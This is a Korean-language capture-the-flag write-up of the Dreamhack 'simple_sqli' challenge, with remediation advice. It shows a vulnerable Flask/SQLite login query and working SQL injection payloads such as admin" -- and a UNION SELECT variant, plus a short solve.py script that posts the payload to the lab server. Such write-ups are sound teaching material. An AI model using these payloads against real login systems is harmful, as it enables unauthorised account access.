---
ctf_name: "Dreamhack Wargame"
challenge_name: "simple_sqli"
category: "web"
difficulty: "easy"
author: "yeahhbean"
date: "2026-07-26"
tags: [sql-injection, sqli, sqlite, flask, auth-bypass]
---

# simple_sqli

## 문제 설명

> 로그인 서비스입니다. SQL INJECTION 취약점을 통해 플래그를 획득하세요.
> 플래그는 `flag.txt`, `FLAG` 변수에 있습니다.

- 유형: web / SQL Injection (인증 우회)
- 첨부: `app.py` (Flask + SQLite)

## 풀이

### 분석

DB 초기화 부분을 먼저 본다.

```python
db.execute('create table users(userid char(100), userpassword char(100));')
db.execute(f'insert into users(userid, userpassword) values '
           f'("guest", "guest"), ("admin", "{binascii.hexlify(os.urandom(16)).decode("utf8")}");')
```

- `users` 테이블에 `guest / guest`, `admin / <랜덤 32 hex>` 두 계정이 들어간다.
- admin 비밀번호는 `os.urandom(16)`을 hex로 인코딩한 32자 랜덤값 → **브루트포스·추측 불가**. 정상 로그인 경로로는 admin을 뚫을 수 없다.

로그인 라우트:

```python
userid = request.form.get('userid')
userpassword = request.form.get('userpassword')
res = query_db(f'select * from users where userid="{userid}" and userpassword="{userpassword}"')
if res:
    userid = res[0]                       # sqlite3.Row → 첫 번째 컬럼(userid)
    if userid == 'admin':
        return f'hello {userid} flag is {FLAG}'
    ...
```

플래그 획득 조건이 명확하다.
**쿼리 결과 첫 행의 첫 번째 컬럼(`userid`)이 `admin`이면 플래그가 노출된다.**

### 취약점

사용자 입력 `userid` / `userpassword`를 **f-string으로 SQL 문에 직접 삽입**한다. 이스케이프·파라미터 바인딩이 전혀 없고, 문자열 구분자가 큰따옴표(`"`)이므로 입력에 `"`를 넣으면 쿼리 구조를 그대로 조작할 수 있다.

```
select * from users where userid="[여기]" and userpassword="[여기]"
```

### 익스플로잇

`userid`에 `admin` 뒤로 `"`를 닫고 `-- `(SQLite 라인 주석)로 이후 조건을 무력화한다.

- **payload (userid):** `admin" -- `
- **payload (userpassword):** 아무 값

완성되는 쿼리:

```sql
select * from users where userid="admin" -- " and userpassword="anything"
```

`-- ` 이후(비밀번호 비교 포함)가 전부 주석 처리되어, 조건은 `userid="admin"` 하나만 남는다.
→ admin 행이 반환되고 `res[0] == 'admin'` → 플래그 출력.

> SQLite에서 `--` 주석은 뒤에 공백/개행이 있어야 한다. 폼 데이터로 `admin" -- `처럼 뒤에 공백을 붙여 전송.

로컬 재현으로 페이로드별 반환 행을 검증했다.

| userid payload | 반환 첫 행 | 플래그 |
| --- | --- | --- |
| `admin" -- ` | `admin` | ✅ |
| `" union select "admin","admin" -- ` | `admin` | ✅ |
| `" or 1=1 -- ` | `guest` | ❌ |

`" or 1=1 -- `는 모든 행이 매칭되지만 **첫 행이 `guest`**라 `res[0] == 'admin'`이 거짓 → 플래그가 안 나온다. 반드시 첫 행을 admin으로 고정해야 한다는 게 이 문제의 함정 포인트.

`solve.py`:

```python
import requests

URL = "http://host3.dreamhack.games:9765/login"

data = {
    "userid": 'admin" -- ',
    "userpassword": "x",
}
r = requests.post(URL, data=data)
print(r.text)
```

## 플래그

```
DH{c1126c8d35d8deaa39c5dd6fc8855ed0}
```

## 배운 점

- **근본 원인은 문자열 결합.** 구분자가 `'`든 `"`든, 사용자 입력을 쿼리 문자열에 이어 붙이는 순간 SQLi가 성립한다.
- **로그인 로직이 첫 행의 `userid` 값에 의존**하기 때문에, 단순 인증 우회(`or 1=1`)가 아니라 **반환 행 순서까지 제어**해야 했다. 취약점 존재 여부보다 "무엇을 반환시켜야 목표가 달성되는가"를 먼저 정의하는 습관.

### 대응 방안

파라미터 바인딩(플레이스홀더)으로 데이터와 쿼리 구조를 분리한다.

```python
cur = get_db().execute(
    "select * from users where userid=? and userpassword=?",
    (userid, userpassword),
)
```

- 문자열 포매팅(f-string, `%`, `+`)으로 쿼리를 만들지 않는다.
- 비밀번호는 평문 비교가 아니라 해시(예: bcrypt) 비교로 저장·검증한다.